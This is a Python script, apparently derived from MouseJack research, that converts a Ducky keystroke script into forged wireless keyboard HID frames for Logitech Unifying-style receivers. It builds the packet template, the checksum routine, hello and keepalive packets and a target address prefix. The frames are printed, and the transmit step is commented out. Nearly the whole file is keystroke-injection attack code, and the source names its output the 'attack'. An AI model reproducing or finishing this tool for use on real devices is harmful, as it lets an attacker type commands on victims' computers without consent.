import duckyparser
import time,codecs
ducky_script = "/home/dolev/Desktop/ducky.txt"

#00:D3:2E:5D:28:C6:D2:6D:31:9C:73:CB:F4:C8:00:00:00:00:00:00:00:AE
payload_template = [0, 0xD3, 0, 0, 0, 0, 0, 0, 0, 0, 0x73, 0xCB, 0xF4, 0, 0, 0, 0, 0, 0, 0, 0, 0]
keepalive = [0x00, 0x40, 0x00, 0x14, 0xAC]
hello = [0x00, 0x4F, 0x00, 0x04, 0xB0, 0x10, 0x00, 0x00, 0x00, 0xED]


def checksum(payload):
        # This is also from the KeyKeriki paper
        # Thanks Thorsten and Max!
        cksum = 0xff
        for n in range(0, len(payload) - 1):
            cksum = (cksum - payload[n]) & 0xff
        cksum = (cksum + 1) & 0xff
        payload[-1] = cksum
        return payload

def key_fun(payload, key):
	payload[2] = key['mod']
	payload[3] = key['hid']
	return payload

def frame(key={'hid': 0, 'mod': 0}):
	return checksum(key_fun(payload_template[:], key))



# if the path is empty exit
if ducky_script == "": 
	print("You must supply a path to ducky script")
	print("Attacks are disabled.")
	sys.exit(0)
else: # if the path is correct parse the script
        f = open(ducky_script, 'r')
        try:
            parser = duckyparser.DuckyParser(f.read(),layout='us')
        except KeyError:
            print("Invalid layout specified")
            exit(-1)

        attack = parser.parse() # the attack HID packet
        
        
for i in range(0, len(attack)):
            key = attack[i]

            if i == 0:
                key['frames'] = [[[76,181,154,214,8] + hello[:]]]
            else:
                key['frames'] = []

            if i < len(attack) - 1:
                next_key = attack[i + 1]
            else:
                next_key = None

            if key['hid'] or key['mod']:
                key['frames'].append([[76,181,154,214,8] + frame(key)])
                key['frames'].append([[76,181,154,214,8] + keepalive[:]])
                #print(key['frames'])
                if not next_key or key['hid'] == next_key['hid'] or next_key['sleep']:
                    key['frames'].append( [[76,181,154,214,8] +frame()])
            elif key['sleep']:
                count = int(key['sleep']) / 10
                for i in range(0, int(count)):
                    key['frames'].append([[76,181,154,214,8] + keepalive[:]])



for key in attack:
    if key['frames']:
        for frame in key['frames']:
            print(frame[0])
            # This code was for additional reliability -- may cause duplicate keystrokes
            # (currently leaving it disabled)
            #
            # if not self.transmit_payload(frame[0]):
            #    for i in range(0,5):
            #        time.sleep(0.1)
            #        if self.transmit_payload(frame[0]):
            #            break
            time.sleep(0.1)
